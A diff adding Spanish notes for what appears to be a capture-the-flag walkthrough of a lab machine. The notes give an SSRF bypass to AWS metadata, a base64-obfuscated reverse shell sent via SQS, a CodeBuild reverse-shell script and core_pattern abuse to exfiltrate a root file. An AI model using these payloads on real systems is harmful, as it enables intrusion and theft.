@@ -1,0 +1,54 @@
+* entra al apartado de jobs en el puerto expuesto 80 http y haz una peticion a 
+  http://169.254.169.254/latest/meta-data/local-ipv4?a=.yaml (sirve para consultar los metadatos de aws, tiene que correr en la instancia. no por fuera)
+* el endpont bloquea esta ruta, tienes que hacer endpoint bypass de el timpo de archivo (exige que termine en yaml, y de la ip que no permite ips locales)
+  ## bypass ##
+  http://0251.0376.0251.0376/latest/meta-data/?a=.yaml
+* investiga qsq para obtener la queue y utilizala para ejecutar un comando python en base64
+
+aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs --message-body 'name: test
+script: import base64;exec(base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3M7c3VicHJvY2Vzcy5Qb3BlbihbImJhc2giLCItYyIsImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkzLzQ0NDQgMD4mMSJdKQo=").decode())' --no-cli-pager
+
+* prepara la netcat y entabal la rev 
+
+* usando este script. crea una nueva maquian y recibe la rev por otro lado
+
+import boto3
+
+buildspec = """version: 0.2
+phases:
+  build:
+    commands:
+      - echo "Shell coming to you!"
+      - bash -c 'bash -i >& /dev/tcp/10.10.14.193/5555 0>&1' || true
+"""
+
+cb = boto3.client('codebuild', endpoint_url='http://floci:4566',
+    aws_access_key_id='test', aws_secret_access_key='test', region_name='us-east-1')
+
+try:
+    cb.delete_project(name='shell')
+except:
+    pass
+
+cb.create_project(
+    name='shell',
+    source={'type': 'NO_SOURCE'},
+    artifacts={'type': 'NO_ARTIFACTS'},
+    environment={
+        'type': 'LINUX_CONTAINER',
+        'computeType': 'BUILD_GENERAL1_SMALL',
+        'image': 'floci/floci:latest',
+        'privilegedMode': True,
+    },
+    serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
+)
+
+r = cb.start_build(
+    projectName='shell',
+    environmentVariablesOverride=[
+        {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
+    ],
+    buildspecOverride=buildspec,
+)
+
+una vez dentro de la nueva instancia de docker en root, abusa del archivo core_patter para enviarte la /root/root.txt por netcat y listo
